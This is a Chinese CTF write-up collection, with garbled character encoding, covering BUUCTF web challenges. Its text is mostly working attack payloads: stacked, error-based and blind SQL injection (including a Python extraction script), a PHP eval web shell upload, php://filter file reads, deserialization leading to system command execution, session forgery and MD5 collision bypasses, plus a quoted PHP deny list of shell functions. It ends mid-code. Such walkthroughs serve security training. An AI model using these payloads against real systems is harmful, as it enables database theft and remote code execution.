å‡ºæ¥ä¸¤ä¸ªè¡¨\n1 2 1\u0026#39;; show columns from words;# 1\u0026#39;; show columns from `1919810931114514`;# è¿™è¾¹æ³¨æ„æ•°å­—è¦ç”¨`åå¼•å·åŒ…èµ·æ¥\næ•°å­—è¡¨ä¸­æœ‰flag\npayload\n1 2 3 4 5 6 7 8 9 1\u0026#39;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);# 1ï¼Œé€šè¿‡ rename å…ˆæŠŠ words è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚ 2ï¼ŒæŠŠ 1919810931114514 è¡¨çš„åå­—æ”¹ä¸º words ã€‚ 3 ï¼Œç»™æ–° words è¡¨æ·»åŠ æ–°çš„åˆ—å id ã€‚ 4ï¼Œå°† flag æ”¹åä¸º data ã€‚ æˆ–è€…\n1 2 3 4 1â€™;rename tables words to words1;rename tables 1919810931114514 to words; alter table words change flag id varchar(100);# å°†wordsè¡¨åæ”¹ä¸ºwords1ï¼Œ1919810931114514è¡¨åæ”¹ä¸ºwordsï¼Œå°†ç°åœ¨çš„wordsè¡¨ä¸­çš„flagåˆ—åæ”¹ä¸ºid ç„¶åç”¨1â€™ or 1=1 #å¾—åˆ°flag è§£æ³•äºŒ\nå› ä¸ºselectè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å…ˆå°†select * from 1919810931114514è¿›è¡Œ16è¿›åˆ¶ç¼–ç \n1 2 3 4 5 6 7 8 9 10 11 12 payload å…ˆæŠŠ0xselect * from `1919810931114514` 16è¿›åˆ¶ç¼–ç  1â€™;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# SELECTå¯ä»¥åœ¨ä¸€æ¡è¯­å¥é‡Œå¯¹å¤šä¸ªå˜é‡åŒæ—¶èµ‹å€¼,è€ŒSETåªèƒ½ä¸€æ¬¡å¯¹ä¸€ä¸ªå˜é‡èµ‹å€¼ï¼Œå¦‚ä¸‹ï¼š å¤åˆ¶ä»£ç  ä»£ç å¦‚ä¸‹: SELECT @VAR1=â€˜Yâ€™,@VAR2=â€˜Nâ€™ â€“ è€ŒSETè¦è¾¾åˆ°åŒæ ·çš„æ•ˆæœï¼Œéœ€è¦ï¼š SET @VAR1=â€˜Yâ€™ SET @VAR2=â€˜Nâ€™ prepareâ€¦fromâ€¦æ˜¯é¢„å¤„ç†è¯­å¥ï¼Œä¼šè¿›è¡Œç¼–ç è½¬æ¢ã€‚ executeç”¨æ¥æ‰§è¡Œç”±SQLPrepareåˆ›å»ºçš„SQLè¯­å¥ è§£æ³•ä¸‰\nç”¨handlerå‘½ä»¤æŸ¥çœ‹ï¼Œ\n1 2 3 4 5 1\u0026#39;; handler 1919810931114514 open as a;handler a read next;# handlerä»£æ›¿selectï¼Œä»¥ä¸€è¡Œä¸€è¡Œæ˜¾ç¤ºå†…å®¹ openæ‰“å¼€è¡¨ asæ›´æ”¹è¡¨çš„åˆ«åä¸ºa read nextè¯»å–æ•°æ®æ–‡ä»¶å†…çš„æ•°æ®æ¬¡æ•° 10ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File æŸ¥çœ‹æºç ï¼Œå‘ç°å…¶ä»–phpæ–‡ä»¶\nend.phpå‰é¢çš„æ–‡ä»¶æŠ“åŒ…\nå‘ç°secr3t.php\nè®¿é—®flag.php\nç”¨å‰é¢Includeçš„æ–¹æ³•phpä¼ªåè®®\n1 /secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php 11ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Http æŸ¥çœ‹æºç å‘ç°Secret.php\nIt doesnâ€™t come from â€˜https://www.Sycsecret.comâ€™ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªé¡µé¢å¾—æ¥è‡ªhttps://www.Sycsecret.comï¼Œæ·»åŠ refererå³å¯\næ·»åŠ User-Agent:Syclover\næ·»åŠ X-Forwarded-For:127.0.0.1\n12ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload è¦æ±‚ä¸Šä¼ å›¾ç‰‡ï¼Œæˆ‘ä»¬æŠŠæ–‡ä»¶ç±»å‹æ”¹ä¸ºimage/jpeg\nä¸‹é¢è¡¥ä¸ŠGIF89a\nä¸Šä¼ çš„å†…å®¹è¢«è¯†åˆ«å‡º\u0026lt;?è¦æ”¹ä¸º\n1 \u0026lt;script language=\u0026#39;php\u0026#39;\u0026gt;@eval($_POST[\u0026#39;cmd\u0026#39;]);\u0026lt;/script\u0026gt; ç„¶åå°è¯•ç­‰ä»·åç¼€åï¼Œæœ€åphtmlä¸Šä¼ æˆåŠŸï¼Œè¿›uploadç›®å½•ï¼Œèšå‰‘è¿æ¥\n13ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife èšå‰‘è¿æ¥\n14ã€[ACTF2020 æ–°ç”Ÿèµ›]Upload å‰ç«¯éªŒè¯æŠŠonsubmitåˆ æ‰ï¼Œåé¢è·Ÿ12é¢˜ä¸€æ ·\n15ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL å•å¼•å·é—­åˆï¼Œç„¶åå¾ˆå¤šè¢«è¿‡æ»¤äº†ï¼Œéƒ½ç”¨åŒå†™ç»•è¿‡,check.phpåæ‹¼æ¥\n1 username=1%27%20ununionion%20seselectlect%201,2,group_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema=%27ctf%27%23\u0026amp;password=1 16ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP www.zipä¸‹è½½æºç \nååºåˆ—åŒ–\n1 2 3 4 5 6 7 8 9 \u0026lt;?php class Name{ private $username = \u0026#39;admin\u0026#39;; private $password = \u0026#39;100\u0026#39;; } $select = new Name(); echo serialize($select); æŠŠç»“æœçš„å¥‡æ€ªç¬¦å·ç”¨%00ä»£æ›¿ï¼Œ%00æ˜¯ç©ºæ ¼çš„urlç¼–ç \n17ã€[ACTF2020 æ–°ç”Ÿèµ›]BackupFile phpå¼±æ¯”è¾ƒkey=123\n18ã€[RoarCTF 2019]Easy Calc æºç é‡Œé¢æŸ¥çœ‹calc.php\nnumä¼ å‚åªèƒ½ä¼ æ•°å­—ï¼Œä½†æ˜¯æˆ‘ä»¬ç”¨+numæˆ–è€…ç©ºæ ¼numå°±èƒ½ä¼ å­—ç¬¦ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™å»æ‰ï¼Œè¿™æ ·ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚\nè¿‡æ»¤/ï¼Œæˆ‘ä»¬ç”¨chr(47)ç»•è¿‡ï¼Œphpinfo();çœ‹åˆ°ç¦ç”¨system,ç”¨var_dump(scandir(/))\nçœ‹åˆ°flagæ˜¯f1agg\n1 +num=1;var_dump(file_get_contents(chr(47).f1agg)) 19ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag å¯†ç å¼±æ¯”è¾ƒï¼Œmoneyç”¨1e9æˆ–è€…money[]=1æ•°ç»„ç»•è¿‡ï¼Œcookieé‡Œé¢useræ”¹ä¸º1\n20ã€BJDCTF2020]Easy MD5 æ‰“å¼€ç½‘ç»œï¼Œçœ‹åˆ°hint\n1 select * from \u0026#39;admin\u0026#39; where password=md5($pass,true) è¦åœ¨passwordè¿™é‡Œæ‹¼æ¥ä¸€ä¸ªor 1å°±å¯ä»¥ä½¿ç»“æœä¸ºçœŸ\nmd5åŠ å¯†åå¾—åˆ°hashå€¼ï¼Œsqlè¯­å¥ä¼šæŠŠhexå€¼è½¬ä¸ºascii\nffifdyop è¿™ä¸ªå­—ç¬¦ä¸²è¢« md5 å“ˆå¸Œäº†ä¹‹åä¼šå˜æˆ 276f722736c95d99e921722cf9ed621cï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å‰å‡ ä½åˆšå¥½æ˜¯ ' or '6\næ‹¼æ¥åç»“æœä¹Ÿä¸ºçœŸ\nè®¡ç®—è„šæœ¬\n1 2 3 4 5 6 7 8 \u0026lt;?php for ($i = 0;;) { for ($c = 0; $c \u0026lt; 1000000; $c++, $i++) if (stripos(md5($i, true), \u0026#39;\\\u0026#39;or\\\u0026#39;\u0026#39;) !== false) echo \u0026#34;\\nmd5($i) = \u0026#34; . md5($i, true) . \u0026#34;\\n\u0026#34;; echo \u0026#34;.\u0026#34;; } ?\u0026gt; md5å‡½æ•° md5 å‡½æ•°é€šå¸¸ç”¨äºè®¡ç®—è¾“å…¥å­—ç¬¦ä¸²çš„ MD5 å“ˆå¸Œå€¼ã€‚md5(string, raw) è¿™ç§å½¢å¼çš„å‡½æ•°è°ƒç”¨ä¸­ï¼Œstring æ˜¯éœ€è¦è¿›è¡Œå“ˆå¸Œè®¡ç®—çš„è¾“å…¥å­—ç¬¦ä¸²ï¼Œè€Œ raw æ˜¯ä¸€ä¸ªå¸ƒå°”ç±»å‹çš„å‚æ•°ï¼Œç”¨äºæŒ‡å®šè¿”å›çš„å“ˆå¸Œå€¼çš„æ ¼å¼ã€‚\nstringï¼šè¿™æ˜¯å¿…éœ€çš„å‚æ•°ï¼Œä»£è¡¨è¦è¿›è¡Œ MD5 å“ˆå¸Œè®¡ç®—çš„åŸå§‹å­—ç¬¦ä¸²æ•°æ®ã€‚å¯ä»¥æ˜¯ä»»æ„é•¿åº¦çš„æ–‡æœ¬ä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·å¯†ç ã€æ–‡ä»¶å†…å®¹ç­‰ã€‚ rawï¼šè¿™æ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œä¸åŒç¼–ç¨‹è¯­è¨€å¯¹è¯¥å‚æ•°çš„å¤„ç†å’Œå«ä¹‰å¯èƒ½æœ‰æ‰€ä¸åŒï¼Œä½†ä¸€èˆ¬æ¥è¯´ï¼š å½“ raw ä¸º true æˆ–è€…ç±»ä¼¼è¡¨ç¤ºçœŸçš„å€¼æ—¶ï¼Œå‡½æ•°ä¼šè¿”å›åŸå§‹çš„ 128 ä½ï¼ˆ16 å­—èŠ‚ï¼‰äºŒè¿›åˆ¶æ ¼å¼çš„å“ˆå¸Œå€¼ã€‚ å½“ raw ä¸º false æˆ–è€…ç±»ä¼¼è¡¨ç¤ºå‡çš„å€¼æ—¶ï¼Œå‡½æ•°ä¼šè¿”å›ä»¥ 32 ä½åå…­è¿›åˆ¶å­—ç¬¦ä¸²å½¢å¼è¡¨ç¤ºçš„å“ˆå¸Œå€¼ã€‚ æ¥ä¸‹æ¥æ˜¯md5å¼±æ¯”è¾ƒ,å¼€å¤´ä¸º0eå°±è¡Œ\n1 2 3 4 5 6 7 MAUXXQC 0e478478466848439040434801845361 IHKFRNS 0e256160682445802696926137988570 GZECLQZ 0e537612333747236407713628225676 GGHMVOE 0e362766013028313274586933780773 GEGHBXL 0e248776895502908863709684713578 EEIZDOI 0e782601363539291779881938479162 DYAXWCA 0e424759758842488633464374063001 ç„¶åæ˜¯md5å¼ºæ¯”è¾ƒï¼Œæ•°ç»„ç»•è¿‡\n1 2 3 4 5 param1[]=1\u0026amp;param2[]=2 æˆ–è€…ç¡®å®æœ‰a!=bä½†æ˜¯MD5å€¼ç›¸åŒçš„ param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\u0026amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 æˆ–è€… a=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2\u0026amp;b=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2 21ã€[HCTF 2018]admin éšä¾¿æ³¨å†Œè´¦å·æœ‰ä¸ªä¿®æ”¹å¯†ç çš„é€‰é¡¹\næŸ¥çœ‹æºç \nè¿™é‡Œæœ‰ä¸€ä¸ªé“¾æ¥ä½†æ˜¯å¤±æ•ˆäº†ï¼Œç½‘ä¸Šæ‰¾åˆ«äººçš„wp,å¾—åˆ°secret_key=ckj123ï¼Œéœ€è¦ä¼ªé€ session\nç„¶åæ”¹session,å¾—åˆ°flag\nunicodeæ¬ºéª—ï¼Œæºç é‡Œé¢æœ‰strlowerå‡½æ•°ï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå¤§å†™çš„ADMINè´¦æˆ·ï¼Œä¼šè¢«ç¼–è¯‘æˆå°å†™çš„ï¼Œç„¶åä¿®æ”¹å¯†ç å°±èƒ½ç™»å…¥ï¼Œä½†éšåå‘ç°æ³¨å†Œå’Œç™»å½•éƒ½ç”¨äº†è½¬å°å†™ï¼Œæ³¨å†ŒADMINçš„è®¡åˆ’å¤±è´¥\n1 2 3 def strlower(username): username = nodeprep.prepare(username) return username è¿™é‡Œçš„nodeprep.prepareå­˜åœ¨æ¼æ´\ná´€Ê™á´„á´…á´‡êœ°É¢ÊœÉªá´Šá´‹ÊŸá´É´á´á´˜Ê€êœ±á´›á´œá´ á´¡Êá´¢è¿™ç§ç¼–ç ä¼šå…ˆè½¬ä¸ºå¤§å†™çš„ï¼Œå†è½¬ä¸ºå°å†™ï¼Œå°±èƒ½ä¼ªé€ admin\n1 á´€ -\u0026gt; A -\u0026gt; a æ³¨å†Œç”¨æˆ·á´€dmin ç™»å½•ç”¨æˆ·á´€dminï¼Œå˜æˆAdmin ä¿®æ”¹å¯†ç Adminï¼Œæ›´æ”¹äº†adminçš„å¯†ç  22ã€[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢ ä¼ .htaccessæ–‡ä»¶æŠŠjpgè½¬ä¸ºphpï¼ŒæŠ“åŒ…æ”¹æ–‡ä»¶æ ¼å¼ï¼Œè¿™é‡Œjpgä¸è¡Œè¦ç”¨pngï¼Œä¸Šä¼ èšå‰‘è¿æ¥\n23ã€[ZJCTF 2019]NiZhuanSiWei textç”¨dataä¼ å€¼ï¼Œç„¶åfileä¼ useless.phpçœ‹phpå†…å®¹\nè¿˜æœ‰ä¸€ä¸ªpasswordè¦ååºåˆ—åŒ–\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php class Flag{ //flag.php public $file=\u0026#34;flag.php\u0026#34;; public function __tostring(){ if(isset($this-\u0026gt;file)){ echo file_get_contents($this-\u0026gt;file); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; return (\u0026#34;U R SO CLOSE !///COME ON PLZ\u0026#34;); } } } $a=new Flag(); echo serialize($a); ?\u0026gt; 24ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL ç©ºæ ¼å’Œ/**/è¢«è¿‡æ»¤äº†ï¼Œç”¨ï¼ˆï¼‰ç»•è¿‡ï¼Œç”¨æŠ¥é”™æ³¨å…¥\n1 2 3 4 username=1\u0026#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#\u0026amp;password=1 username=1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),0x7e),1))#\u0026amp;password=1 username=1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database()))),0x7e),1))#\u0026amp;password=1 username=1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#\u0026amp;password=1 flagæ˜¾ç¤ºä¸å…¨ï¼Œsubstringè¢«è¿‡æ»¤ï¼Œåªèƒ½ç”¨leftå’Œrightæ„é€ \n1 username=1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#\u0026amp;password=1 flag{8c32c5d2-2601-4575-b121-a16d5f8c0d2e}\n[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz ä¸¤ç§è§£æ³•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php class FileHandler { protected $op=2; protected $filename=\u0026#39;flag.php\u0026#39;; protected $content; } $o = new FileHandler(); $o = urlencode(serialize($o));//æœ‰ä¸å¯æ‰“å°å­—ç¬¦ä½†åˆä¸èƒ½ä¸¢å¼ƒï¼Œurlç¼–ç  $o =str_replace(\u0026#39;%00\u0026#39;,\u0026#39;\\00\u0026#39;,$o); //å› ä¸ºæ£€æµ‹å‡½æ•°è¦æ±‚å­—ç¬¦åœ¨asciiç 32-125ï¼Œä½†æ˜¯%00ä¸åœ¨èŒƒå›´å†…ï¼Œè¦æ”¹æˆ\\00 $o =str_replace(\u0026#39;s\u0026#39;,\u0026#39;S\u0026#39;,$o); //æ”¹ä¸º\\00åï¼Œååºåˆ—åŒ–åä¸ä¼šè¯†åˆ«\\00ï¼Œå°å†™sè¡¨ç¤ºå­—ç¬¦ä¸²,å¤§å†™Sè¡¨ç¤º16è¿›åˆ¶å­—ç¬¦ä¸² echo $o; ?\u0026gt; åˆ©ç”¨å½“PHPç‰ˆæœ¬ \u0026gt;= 7.2 æ—¶ï¼Œååºåˆ—åŒ–å¯¹è®¿é—®ç±»åˆ«ä¸æ•æ„Ÿã€‚\nç›´æ¥æ”¹ä¸ºpublic,è¯»å–base64ç¼–ç åçš„flag.php\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php class FileHandler { public $op=2; public $filename=\u0026#39;php://filter/convert.base64-encode/resource=flag.php\u0026#39;; public $content; } $o = new FileHandler(); echo $o = urlencode(serialize($o)); ?\u0026gt; [GXYCTF2019]BabySQli exp\n1 2 \u0026#39; union select 1,\u0026#39;admin\u0026#39;, \u0026#39; 202cb962ac59075b964b07152d234b70 \u0026#39;# 123 æºç è¿™é‡Œæœ‰æç¤º\nè”åˆæ³¨å…¥ï¼Œç¬¬äºŒä½è¦å¡«adminï¼Œç¬¬ä¸‰ä½å¡«åŠ å¯†åçš„password\n[GYCTF2020]Blacklist å †å æ³¨å…¥\nå•å¼•å·é—­åˆ\n1 1\u0026#39;;show databases;# 1 1\u0026#39;;show tables;# 1 1\u0026#39;;show columns from FlagHere;# è¿™é‡Œæƒ³ç”¨ä¹‹å‰çš„rename,ç¼–ç è½¬æ¢éƒ½ä¸è¡Œ\nç”¨handlerè¯­å¥\n1 2 3 4 handler table_name open;handler table_name read first;handler table_name close; handler table_name open;handler table_name read next;handler table_name close; é¦–å…ˆæ‰“å¼€æ•°æ®åº“ï¼Œå¼€å§‹è¯»å®ƒç¬¬ä¸€è¡Œæ•°æ®ï¼Œè¯»å–æˆåŠŸåè¿›è¡Œå…³é—­æ“ä½œã€‚ é¦–å…ˆæ‰“å¼€æ•°æ®åº“ï¼Œå¼€å§‹å¾ªç¯è¯»å–ï¼Œè¯»å–æˆåŠŸåè¿›è¡Œå…³é—­æ“ä½œã€‚ æˆ–è€…ç›´æ¥ç”¨ä¹‹å‰çš„payload\n1 1\u0026#39;;handler FlagHere open as a;handler a read next;# [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World sqlæ³¨å…¥ï¼Œä½†æ˜¯è¿‡æ»¤ç©ºæ ¼å’Œè”åˆæ³¨å…¥ï¼ŒæŠ¥é”™æ³¨å…¥ï¼Œç”¨ç›²æ³¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import requests import time import re url=\u0026#39;http://1e88c184-cbcd-4755-bc2e-1122d382e665.node5.buuoj.cn:81/index.php\u0026#39; flag = \u0026#39;\u0026#39; for i in range(1,43): max = 127 min = 0 for c in range(0,127): s = (int)((max+min)/2) payload = \u0026#39;1^(ascii(substr((select(flag)from(flag)),\u0026#39;+str(i)+\u0026#39;,1))\u0026gt;\u0026#39;+str(s)+\u0026#39;)\u0026#39; r = requests.post(url,data = {\u0026#39;id\u0026#39;:payload}) time.sleep(0.005) if \u0026#39;Hello, glzjin wants a girlfriend.\u0026#39; in str(r.content): max=s else: min=s if((max-min)\u0026lt;=1): flag+=chr(max) break print(flag) è¿™é‡Œå› ä¸ºæ˜¯orè¢«è¿‡æ»¤ç”¨å¼‚æˆ–ç¬¦å·æ›¿ä»£\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import requests import time url=\u0026#39;http://1e88c184-cbcd-4755-bc2e-1122d382e665.node5.buuoj.cn:81/index.php\u0026#39; flag = \u0026#39;\u0026#39; for i in range(1,43): max = 127 min = 0 for c in range(0,127): n = (int)((max+min)/2) payload = \u0026#39;0^(ascii(substr((select(flag)from(flag)),\u0026#39;+str(i)+\u0026#39;,1))\u0026gt;\u0026#39;+str(n)+\u0026#39;)\u0026#39; r = requests.post(url,data = {\u0026#39;id\u0026#39;:payload}) time.sleep(0.005) if \u0026#39;Hello\u0026#39; in str(r.content): min=n else: max=n if((max-min)\u0026lt;=1): flag+=chr(max) print(\u0026#34;\\r\u0026#34;, end=\u0026#34;\u0026#34;) print(flag,end=\u0026#39;\u0026#39;) break [RoarCTF 2019]Easy Java ç‚¹helpï¼Œå‘ç°æ²¡ä»€ä¹ˆç”¨ï¼ŒæŠ“åŒ…æ”¹post\nä¸‹è½½ä¸‹æ¥æ²¡ç”¨ï¼Œç”±äºé¢˜ç›®åç§°æ˜¯javaï¼Œæƒ³åˆ°ä¸‹è½½web.xml\nä¸‹è½½åé¢è¿™ä¸ªclassç±»\nå¯ä»¥ä¸‹è½½ä¸‹æ¥åç¼–è¯‘æˆ–è€…è¿™é‡Œå°±ç›´æ¥æœ‰base64ç¼–ç çš„å­—ç¬¦ä¸²\n[BSidesCF 2020]Had a bad day è¿™é¢˜ä¸»è¦æ˜¯ç”¨åˆ°php://filterä¼ªåè®®å¯ä»¥å¥—ä¸€å±‚åè®®\n1 category=php://filter/convert.base64-encode/resource=index.php å¯ä»¥çœ‹åˆ°è‡ªåŠ¨æ‹¼æ¥äº†phpåç¼€\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php $file = $_GET[\u0026#39;category\u0026#39;]; if(isset($file)) { if( strpos( $file, \u0026#34;woofers\u0026#34; ) !== false || strpos( $file, \u0026#34;meowers\u0026#34; ) !== false || strpos( $file, \u0026#34;index\u0026#34;)){ include ($file . \u0026#39;.php\u0026#39;); } else{ echo \u0026#34;Sorry, we currently only support woofers and meowers.\u0026#34;; } } ?\u0026gt; 1 category=woofers/../flag å°è¯•ç›®å½•ç©¿è¶Šï¼Œç›´æ¥è¯»å–ä¸äº†flag\nè¿™é‡Œç”¨åˆ°ä¼ªåè®®å¯ä»¥å¥—ä¸€å±‚åè®®\n1 category=php://filter/convert.base64-encode/index/resource=flag [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb ç•Œé¢ä¸€ç›´åœ¨è‡ªå·±åˆ·æ–°æˆ‘ä»¬æŠ“åŒ…çœ‹çœ‹\nå¯èƒ½æ˜¯funcå‚æ•°ä¸ºå‡½æ•°ç„¶åpä¸ºå‡½æ•°å€¼ï¼Œæˆ‘ä»¬å…ˆæŸ¥çœ‹index.phpï¼Œç”¨file_get_contents,highlight_file() ï¼Œshow_source()éƒ½è¡Œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php $disable_fun = array(\u0026#34;exec\u0026#34;,\u0026#34;shell_exec\u0026#34;,\u0026#34;system\u0026#34;,\u0026#34;passthru\u0026#34;,\u0026#34;proc_open\u0026#34;,\u0026#34;show_source\u0026#34;,\u0026#34;phpinfo\u0026#34;,\u0026#34;popen\u0026#34;,\u0026#34;dl\u0026#34;,\u0026#34;eval\u0026#34;,\u0026#34;proc_terminate\u0026#34;,\u0026#34;touch\u0026#34;,\u0026#34;escapeshellcmd\u0026#34;,\u0026#34;escapeshellarg\u0026#34;,\u0026#34;assert\u0026#34;,\u0026#34;substr_replace\u0026#34;,\u0026#34;call_user_func_array\u0026#34;,\u0026#34;call_user_func\u0026#34;,\u0026#34;array_filter\u0026#34;, \u0026#34;array_walk\u0026#34;, \u0026#34;array_map\u0026#34;,\u0026#34;registregister_shutdown_function\u0026#34;,\u0026#34;register_tick_function\u0026#34;,\u0026#34;filter_var\u0026#34;, \u0026#34;filter_var_array\u0026#34;, \u0026#34;uasort\u0026#34;, \u0026#34;uksort\u0026#34;, \u0026#34;array_reduce\u0026#34;,\u0026#34;array_walk\u0026#34;, \u0026#34;array_walk_recursive\u0026#34;,\u0026#34;pcntl_exec\u0026#34;,\u0026#34;fopen\u0026#34;,\u0026#34;fwrite\u0026#34;,\u0026#34;file_put_contents\u0026#34;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == \u0026#34;string\u0026#34;) { return $result; } else {return \u0026#34;\u0026#34;;} } class Test { var $p = \u0026#34;Y-m-d h:i:s a\u0026#34;; var $func = \u0026#34;date\u0026#34;; function __destruct() { if ($this-\u0026gt;func != \u0026#34;\u0026#34;) { echo gettime($this-\u0026gt;func, $this-\u0026gt;p); } } } $func = $_REQUEST[\u0026#34;func\u0026#34;]; $p = $_REQUEST[\u0026#34;p\u0026#34;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(\u0026#34;Hacker...\u0026#34;); } } ?\u0026gt; 1 2 3 4 5 6 7 8 9 class Test { var $p = \u0026#34;Y-m-d h:i:s a\u0026#34;; var $func = \u0026#34;date\u0026#34;; function __destruct() { if ($this-\u0026gt;func != \u0026#34;\u0026#34;) { echo gettime($this-\u0026gt;func, $this-\u0026gt;p); } } } è¿™é‡Œå¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–ï¼Œæ¥rceï¼Œå› ä¸ºgettimeå‡½æ•°æœ¬è´¨æ˜¯call_user_funcå‡½æ•°ï¼Œå¯ä»¥rce\n1 2 3 4 5 6 7 8 \u0026lt;?php class Test { var $p = \u0026#34;ls\u0026#34;; var $func = \u0026#34;system\u0026#34;; } $obj = new Test(); echo serialize($obj); ?\u0026gt; ç„¶åå‰é¢funcä¼ unserializeå‡½æ•°\néƒ½æ²¡æœ‰æˆ‘ä»¬ç›´æ¥findæŸ¥æ‰¾\næˆ–è€…\n1 2 func=readfile\u0026amp;p=/tmp/flagoefiu4r93 func=unserialize\u0026amp;p=O:4:\u0026#34;Test\u0026#34;:2:{s:1:\u0026#34;p\u0026#34;;s:25:\u0026#34;cat $(find / -name flag*)\u0026#34;;s:4:\u0026#34;func\u0026#34;;s:6:\u0026#34;system\u0026#34;;} è¿™é‡Œå¥½åƒè¿˜æœ‰éé¢„æœŸ\n\\å·åé¢çš„å‘½ä»¤ä¸ä¼šè¢«è¯†åˆ«\n1 2 func=\\system\u0026amp;p=find / -name flag* func=\\system\u0026amp;p=cat /tmp/flagoefiu4r93 [BJDCTF2020]The mystery of ip smartyæ³¨å…¥\n[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤ è¯»å–next.phpå†…å®¹\nä¸‹é¢postä¼ i have a dream\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php $id = $_GET[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;id\u0026#39;] = $id; function complex($re, $str) { return preg_replace( \u0026#39;/(\u0026#39; . $re . \u0026#39;)/ei\u0026#39;, \u0026#39;strtolower(\u0026#34;\\\\1\u0026#34;)\u0026#39;, $str ); } foreach($_GET as $re =\u0026gt; $str) { echo complex($re, $str). \u0026#34;\\n\u0026#34;; } function getFlag(){ @eval($_GET[\u0026#39;cmd\u0026#39;]); } 